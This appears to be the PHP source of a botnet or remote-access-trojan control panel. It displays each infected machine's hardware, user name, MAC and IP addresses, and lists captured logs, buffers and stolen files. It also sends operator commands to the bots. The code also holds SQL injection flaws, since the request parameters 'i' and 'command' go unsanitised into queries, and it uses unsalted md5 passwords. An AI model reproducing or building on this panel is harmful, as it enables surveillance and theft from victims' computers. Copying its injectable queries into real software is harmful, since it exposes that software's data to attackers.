<?php
 require_once('assets/config.php');
 $query = $mysqli->query("SELECT * FROM administrators WHERE id=1");
 $result = $query->fetch_assoc();
 session_start();
 ini_set('session.bug_compat_warn', 0);
 ini_set('session.bug_compat_42', 0);

  if(isset($_POST['submit'])) {
    if(($_POST['login'] == $result['login']) and (md5($_POST['pass']) == $result['pass'])) {
      $_SESSION['login'] = $result['login'];
      $_SESSION['pass'] = $result['pass'];
    } else { header("Location: index.php?i=edata"); exit; }
  } elseif( ($_SESSION['login'] == $result['login']) and ($_SESSION['pass'] == $result['pass']) ) {
    $i = $_GET['i'];
    if(isset($_POST['command'])) { 
     $command = $_POST['command'];
     if ($command == "clear_buffer") {
      $mysqli->query("UPDATE bots SET buffer='' WHERE uid='$i'"); 
     } elseif($command == "clear_log") {
      $mysqli->query("UPDATE bots SET log='' WHERE uid='$i'"); 
     } elseif($command == "user_delete") {
      $mysqli->query("DELETE FROM bots WHERE uid='$i'");
      header("Location: admin.php");
     } elseif($command == "files") {
      header("Location: files.php?i=$i");
      exit;
     } else {
      $mysqli->query("UPDATE bots SET team='$command' WHERE uid='$i'");
     }
     header("Location: control.php?i=$i");
    }
  } else { header("Location: index.php?i=eauth"); exit; }
?>
<html>
 <head>
  <title>- Administration -</title>
  <meta charset="UTF-8">
  <link rel="stylesheet" href="assets/css/style.css" media="screen" type="text/css" />
 </head>
 <body>
  <nav class="header">
   <p class="text-tag"><?php echo $result['login']; ?>
    <input class="header-button" style="margin-left: 15px;" type="button" value="Users" onClick='location.href="admin.php"'>
    <input class="header-button" type="button" value="Settings" onClick='location.href="settings.php"'>
    <input class="header-logout" type="button" value="Logout" onClick='location.href="logout.php"'>
   </p>
  </nav> 
  <div class="user-info">

    <p class="user-info-text"><b>Tag: </b><?php 
      $query = $mysqli->query("SELECT tag FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['tag'];
      ?></p>

    <hr>

  	<p class="user-info-text"><b>Operating System: </b><?php 
  		$query = $mysqli->query("SELECT os FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['os'];
      ?></p>

    <p class="user-info-text"><b>Machine Name: </b><?php 
  		$query = $mysqli->query("SELECT mhn FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['mhn'];
      ?></p>

    <p class="user-info-text"><b>User Name: </b><?php 
  		$query = $mysqli->query("SELECT usr FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['usr'];
      ?></p>

    <p class="user-info-text"><b>Time Zone: </b><?php 
      $query = $mysqli->query("SELECT tmz FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['tmz'];
      ?></p>

    <hr>

    <p class="user-info-text"><b>Mac-Address: </b><?php 
      $query = $mysqli->query("SELECT mac FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['mac'];
      ?></p>

    <p class="user-info-text"><b>External IP-Address: </b><?php 
  		$query = $mysqli->query("SELECT ip FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['ip'];
      ?></p>

    <p class="user-info-text"><b>Local IP-Address: </b><?php 
  		$query = $mysqli->query("SELECT lip FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['lip'];
      ?></p>

    <hr>

    <p class="user-info-text"><b>CPU: </b><?php 
  		$query = $mysqli->query("SELECT cpu FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['cpu'];
      ?></p>

    <p class="user-info-text"><b>GPU: </b><?php 
  		$query = $mysqli->query("SELECT gpu FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['gpu'];
      ?></p>

    <p class="user-info-text"><b>RAM: </b><?php 
      $query = $mysqli->query("SELECT ram FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['ram'];
      ?></p>

    <hr>

    <p class="user-info-text"><b>First Response: </b><?php 
  		$query = $mysqli->query("SELECT fresponse FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['fresponse'];
      ?></p>

    <p class="user-info-text"><b>Last Response: </b><?php 
  		$query = $mysqli->query("SELECT lresponse FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();
        echo $result['lresponse'];
      ?></p>

  </div>
  <div class="user-log">
   <div class="user-log-in">
      <?php 
        $query = $mysqli->query("SELECT log FROM bots WHERE uid='$i'");
        $result = $query->fetch_assoc();

        echo $result['log'];
      ?>
   </div>
  </div>
  <div class="user-flist">
   <?php 
    if(file_exists("data/files_users/$i")) {
     $array = scandir("data/files_users/$i");
     for($ic = 2; $ic <= count($array)-1; $ic++) {
      $name = $array[$ic];
      echo "<p class=\"file\" onClick='location.href=\"data/files_users/$i/$name\"' > ".$name."</p>";
     }
    }
   
   ?>
  </div>
  <div class="user-input">
   <div class="user-input-plane">
    <?php 
     $query = $mysqli->query("SELECT buffer FROM bots WHERE uid='$i'");
     $result = $query->fetch_assoc();

     echo $result['buffer'];
    ?>
   </div>
   <?php echo "<form method=\"post\" action=\"control.php?i=$i\">" ?>
    <input class="user-input-field" type="text" name="command" autocomplete="off">
   </form>
  </div>
 </body>
</html>